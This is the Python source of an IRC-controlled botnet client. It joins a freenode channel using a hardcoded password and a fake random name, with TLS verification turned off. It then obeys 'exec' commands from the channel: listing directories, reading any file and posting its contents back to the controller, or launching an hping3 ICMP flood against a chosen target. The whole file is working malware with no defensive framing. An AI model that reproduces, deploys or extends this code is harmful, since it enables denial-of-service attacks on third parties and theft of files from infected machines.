import pydle
import subprocess
from faker import Faker
import os
import re

faker = Faker()

BOT_NAME = faker.first_name()
SERVER_NAME = 'irc.freenode.net'
CHANNEL = '#newircmasternode'
CHANNEL_PASSWORD = '123456'


def handle_message(message):
    if not message.startswith('exec'):
        if message != 'Alive':
            return 'Alive'
        else:
            return ''
    else:
        try:
            target_bot, command, args = re.findall(r'exec (\w+) (\w+) (.+)', message)[0]
            if target_bot in [BOT_NAME, 'all', 'ALL']:
                if command == 'listdir':
                    return listdir(_dir=args)
                elif command == 'cat':
                    return cat(file=args)
                elif command == 'attack':
                    return attack(target=args)
        except IndexError:
            return 'Invalid command'


def attack(target):
    try:
        output = subprocess.check_output(['hping3', '-1', '--flood', target])
        return output
    except subprocess.CalledProcessError:
        return 'An error occurred'


def listdir(_dir):
    try:
        return str(os.listdir(_dir))
    except FileNotFoundError:
        return 'Folder not found'


def cat(file):
    try:
        with open(file, 'r') as read_file:
            contents = read_file.read()
        return contents
    except FileNotFoundError:
        return 'File not found'


class MyOwnBot(pydle.Client):
    async def on_connect(self):
        await self.join(CHANNEL, password=CHANNEL_PASSWORD)

    async def on_message(self, target, source, message):
        if source != self.nickname:
            mess = handle_message(message)
            if mess != '':
                await self.message(target, mess)


client = MyOwnBot(BOT_NAME, realname=BOT_NAME)
client.run(SERVER_NAME, tls=True, tls_verify=False)
